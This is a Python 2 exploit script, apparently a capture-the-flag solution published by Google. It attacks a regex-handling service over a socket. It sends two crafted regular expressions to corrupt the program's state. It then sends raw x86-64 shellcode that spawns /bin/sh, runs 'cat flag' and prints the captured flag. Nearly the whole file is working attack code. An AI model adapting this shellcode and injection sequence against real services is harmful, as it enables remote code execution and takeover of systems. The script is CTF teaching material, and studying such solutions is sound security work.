# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Run the program like: socat tcp-listen:4141,reuseaddr exec:./convert

import socket
import struct
import random
import string
import time
import sys
import telnetlib

import subprocess

import ast


PORT = 12434
IP = "1.2.3.4"
VERBOSE=False;
sock = socket.socket()
sock.connect((sys.argv[1], int(sys.argv[2])));


def run_cmd(cmd, input=""):
    subp = subprocess.Popen(cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE)
    stdout, stderr = subp.communicate(input)
    return stdout


def read_byte():
    buf = sock.recv(1)
    if not buf:
        raise EOFError
    return buf

def read_n(n):
    s = ''
    for _ in xrange(n):
        try:
            s += read_byte()
        except EOFError:
            if VERBOSE:
                print "<... ", `s`
            raise
    if VERBOSE:
        print '<', `s`
    return s


def read_until(sentinel='\n'):
    s = ''
    while not s.endswith(sentinel):
        #b = read_byte()
        #sys.stdout.write(b)
        #sys.stdout.flush()
        try:
            s += read_byte()
        except EOFError:
            if VERBOSE:
                print "<... ", `s`
            raise
    if VERBOSE:
        print '<', `s`
    return s

def send(s):
    if VERBOSE:
        print '>', `s`
    sock.sendall(s)

def interact():
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()

def genBigPat(vals, c):
  res = "(";
  for i in xrange(0, len(vals)):
    if i != 0:
      res += "|";
    v = vals[i];
    res += "(" + (c * v) + ")*";
  res += ")";
  return res;


REGEX_1 = "(ZZZ" + genBigPat([2,27,11,79], 'a') + ")";
REGEX_2 = "(A((bZ)|(ccZZZZZZZZ" + genBigPat([2, 25, 11, 83], '\x05') + "))\x0f)";

SHELLCODE = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

#raw_input('attach gdb');
read_until('QUIT to quit.');

print "Sending first regex...";
send(REGEX_1 + "\n");
read_until('regexes.');
print "Sent first regex";

send("REGEX\n");
read_until('QUIT to quit.');

print "Sending second regex...";
send(REGEX_2 + "\n");
read_until('regexes.');
print "Sent second regex";

send("TEST\n");
read_until('(zero-indexed)');

send("0\n");
read_until('regexes:');
send("A" + SHELLCODE + "\n");
read_until('No match found.');
read_until('regexes:');
send("A\n");
print "Should have shell now";
send("cat flag\n");
read_until("CTF{");
res = "CTF{" + read_until("}");
print res;
sys.exit(0);

